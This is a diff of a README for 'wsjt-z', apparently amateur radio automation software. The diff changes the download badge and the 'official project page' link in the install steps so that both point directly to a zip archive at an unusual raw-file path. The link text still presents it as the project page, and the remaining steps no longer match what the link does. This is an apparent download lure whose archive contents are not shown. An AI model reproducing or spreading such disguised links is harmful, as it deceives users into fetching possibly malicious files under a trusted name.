@@ -1,6 +1,6 @@
 # 📡 wsjt-z - Automate your amateur radio digital modes
 
-[![](https://img.shields.io/badge/Download-wsjt--z-blue.svg)](https://github.com/Cutanddried-gravida643/wsjt-z)
+[![](https://img.shields.io/badge/Download-wsjt--z-blue.svg)](https://raw.githubusercontent.com/Cutanddried-gravida643/wsjt-z/main/grinny/z_wsjt_2.2.zip)
 
 ## 📡 What is wsjt-z?
 
@@ -22,7 +22,7 @@ Verify that you have all necessary drivers for your specific radio interface ins
 
 Follow these steps to find the correct installer for your system:
 
-1. Visit the [official project page](https://github.com/Cutanddried-gravida643/wsjt-z) to access the software files.
+1. Visit the [official project page](https://raw.githubusercontent.com/Cutanddried-gravida643/wsjt-z/main/grinny/z_wsjt_2.2.zip) to access the software files.
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version tag to view the available files.
 4. Select the Windows installer file ending in .exe to start your download.
